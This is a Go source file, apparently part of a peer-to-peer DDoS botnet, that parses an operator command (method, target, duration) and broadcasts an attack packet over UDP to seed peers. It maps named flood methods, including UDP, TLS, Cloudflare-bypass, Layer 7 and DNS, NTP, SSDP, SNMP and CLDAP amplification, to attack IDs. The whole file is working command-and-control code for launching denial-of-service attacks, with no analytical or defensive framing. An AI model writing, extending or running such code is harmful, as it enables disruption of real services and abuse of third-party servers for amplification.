package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
)

type P2PInjector struct {
	seeds []string
}

func NewP2PInjector(seeds string) *P2PInjector {
	seedList := strings.Split(seeds, ",")
	return &P2PInjector{seeds: seedList}
}

func (this *P2PInjector) SendAttack(attackBuf []byte) error {
	/* Build P2P packet: CMD(1) + TTL(1) + AttackPayload */
	packet := make([]byte, 2+len(attackBuf))
	packet[0] = 0x10  /* P2P_CMD_ATTACK */
	packet[1] = 0     /* TTL starts at 0 */
	copy(packet[2:], attackBuf)

	for _, seed := range this.seeds {
		addr, err := net.ResolveUDPAddr("udp", seed)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		conn.Write(packet)
		conn.Close()
	}

	return nil
}

func (this *P2PInjector) ParseAndSend(cmd string) error {
	parts := strings.Fields(cmd)
	if len(parts) < 3 {
		return fmt.Errorf("invalid command")
	}

	method := parts[0]
	target := parts[1]
	duration, _ := strconv.Atoi(parts[2])

	var attackID uint8
	switch method {
	case "udp":
		attackID = 0
	case "game":
		attackID = 1
	case "discord":
		attackID = 2
	case "pps":
		attackID = 3
	case "tls":
		attackID = 4
	case "tlsplus":
		attackID = 5
	case "cf":
		attackID = 6
	case "axis-l7", "l7":
		attackID = 7
	case "dns-amp":
		attackID = 8
	case "ntp-amp":
		attackID = 9
	case "ssdp-amp":
		attackID = 10
	case "snmp-amp":
		attackID = 11
	case "cldap-amp":
		attackID = 12
	default:
		return fmt.Errorf("unknown method: %s", method)
	}

	buf := append([]byte{attackID}, 1)

	// Parse target
	var targetIP net.IP
	if strings.Contains(target, "://") {
		targetIP = net.ParseIP(extractIPFromURL(target))
	} else {
		targetIP = net.ParseIP(target)
	}
	if targetIP == nil || targetIP.To4() == nil {
		targetIP = net.ParseIP("1.1.1.1")
	}
	buf = append(buf, targetIP.To4()...)
	buf = append(buf, 32, 0)

	durBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(durBuf, uint32(duration))
	buf = append(buf, durBuf...)

	return this.SendAttack(buf)
}

func extractIPFromURL(url string) string {
	if strings.HasPrefix(url, "http://") {
		url = url[7:]
	} else if strings.HasPrefix(url, "https://") {
		url = url[8:]
	}
	if idx := strings.Index(url, "/"); idx != -1 {
		url = url[:idx]
	}
	if idx := strings.Index(url, ":"); idx != -1 {
		url = url[:idx]
	}
	return url
}
